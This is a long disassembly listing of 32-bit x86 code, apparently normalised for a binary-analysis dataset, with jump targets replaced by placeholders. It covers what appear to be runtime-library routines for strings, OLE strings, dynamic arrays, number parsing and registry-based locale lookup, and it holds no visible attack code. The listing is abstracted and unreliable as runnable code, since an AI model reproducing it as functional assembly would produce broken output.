mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_404764
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4028e8
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4028e8
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_40471c
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_404764
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_404118
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_4041dc
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_40272c
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4028e8
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_404810
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call SysFreeString
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404834
test edx edx
je sub_4047f8
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_4047f8
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402848
retn
sub_404858
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_4047f8
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404a40
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404258
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404258
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404a40
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_4048e4
jmp r-xdata
sub_4048e4
test ecx ecx
je sub_4047f8
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402848
pop edx
push [ edx ]
mov [ edx ] eax
call SysFreeString
retn
sub_404908
xor ecx ecx
test edx edx
je r-xdata
jmp sub_4048e4
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404970
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_4049f4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404964
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_4048e4
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404a40
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_4047e8
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4047d0
mov ebx eax
mov eax [ edi ]
call sub_404964
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4028e8
mov eax esi
sub_404a84
mov edx [ eax ]
test edx edx
je r-xdata
retn
push eax
mov ecx [ edx - 0x4 ]
shr ecx 0x1
push ecx
push edx
call SysAllocStringLen
pop edx
test eax eax
je r-xdata
mov al 0x1
jmp sub_402848
mov [ edx ] eax
sub_404aa4
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404ad4
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404ad4
test ecx ecx
je r-xdata
retn
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
xor ecx ecx
cmp al 0xa
je r-xdata
mov [ ebx ] ecx
add ebx 0x4
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
mov [ ebx ] ecx
mov [ ebx + 0x4 ] ecx
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0xc ] ecx
add ebx 0x10
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404ad4
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404aa4
dec edi
jg r-xdata
pop ebp
cmp al 0x11
je r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402848
sub_404b68
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404bb4
add esi 0x8
dec edi
jg r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_404bb4
cmp ecx 0x0
je r-xdata
retn
push eax
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xb
je r-xdata
mov edx ecx
call sub_40413c
jmp r-xdata
call sub_404118
jmp r-xdata
cmp ecx 0x1
mov eax ebx
jg r-xdata
cmp al 0xc
je r-xdata
pop edi
pop esi
pop ebx
pop eax
mov edx ecx
call sub_404810
jmp r-xdata
call sub_4047f8
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404b9c
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404bb4
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404b68
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_405ab8
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
add ebx 0x4
call sub_405400
dec edi
jg r-xdata
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
pop eax
mov al 0x2
jmp sub_402848
sub_404cac
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404cf4
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404cf4
push ebx
push esi
push edi
test ecx ecx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ebx eax
mov esi edx
mov edi ecx
xor edx edx
mov al [ esi ]
mov dl [ esi + 0x1 ]
cmp al 0xa
je r-xdata
mov eax [ ebx ]
add ebx 0x4
call sub_4045c8
dec edi
jg r-xdata
cmp al 0xb
je r-xdata
jmp r-xdata
mov eax ebx
add ebx 0x4
call sub_404a84
dec edi
jg r-xdata
cmp al 0xc
je r-xdata
jmp r-xdata
mov eax ebx
add ebx 0x10
call sub_404cdc
dec edi
jg r-xdata
cmp al 0xd
je r-xdata
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xe
je r-xdata
mov edx [ esi + ebp + 0xa ]
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov ecx [ esi + ebp + 0x6 ]
mov edx [ edx ]
call sub_404cf4
dec edi
jg r-xdata
pop ebp
jmp r-xdata
push ebp
mov ebp edx
cmp al 0xf
je r-xdata
mov eax ebx
add ebx [ esi + ebp + 0x2 ]
mov edx esi
call sub_404cac
dec edi
jg r-xdata
pop ebp
jmp r-xdata
mov eax [ ebx ]
add ebx 0x4
call sub_405b2c
dec edi
jg r-xdata
cmp al 0x11
je r-xdata
jmp r-xdata
mov eax [ ebx ]
add ebx 0x4
call sub_405464
dec edi
jg r-xdata
mov al 0x2
pop edi
pop esi
pop ebx
jmp sub_402848
sub_404dcc
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
xor eax eax
mov al [ ecx + 0x1 ]
lea edi [ eax + ecx + 0xa ]
mov ebp [ edi - 0x4 ]
xor eax eax
mov ecx [ edi - 0x8 ]
push ecx
mov eax [ edi + 0x4 ]
mov edx [ edi ]
mov edx [ edx ]
mov cl [ edx ]
cmp cl 0xa
je r-xdata
mov edx eax
add eax esi
add edx ebx
call sub_4028e8
mov edx [ eax + esi ]
add eax ebx
call sub_40416c
mov eax 0x4
jmp r-xdata
cmp cl 0xb
je r-xdata
add eax [ edi + 0x4 ]
add edi 0x8
dec ebp
jne r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_404834
mov eax 0x4
jmp r-xdata
cmp cl 0xc
je r-xdata
mov ecx [ edi + 0x4 ]
sub ecx eax
jle r-xdata
pop ecx
sub ecx eax
jle r-xdata
lea edx [ eax + esi ]
add eax ebx
call sub_404db4
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028e8
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404ee8
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404dcc
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_405ad0
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_40543c
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402848
sub_404ee8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40416c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404834
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404db4
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404ee8
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404dcc
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405ad0
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_40543c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402848
sub_404fe4
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_405008
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402a74
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402a74
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404fe4
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_405268
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405260
jmp r-xdata
mov al 0x4
call sub_402848
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402848
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_40272c
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026ec
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402d00
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404bb4
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028e8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402d00
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_405248
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_405268
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_405400
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_40270c
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404bb4
sub_40543c
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_405400
pop edx
pop eax
sub_405470
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012fc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_4054a0
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40128c
mov eax esp
mov dl 0x1
call sub_4056dc
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_4054e8
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_4054a0
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_405524
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401294
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40129c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405510
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405510
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405510
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_40126c
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_401264
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4056dc
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40128c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012e4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4057e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_405524
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ec
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012e4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012dc
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ec
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012e4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_4012ac
push eax
call sub_401284
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
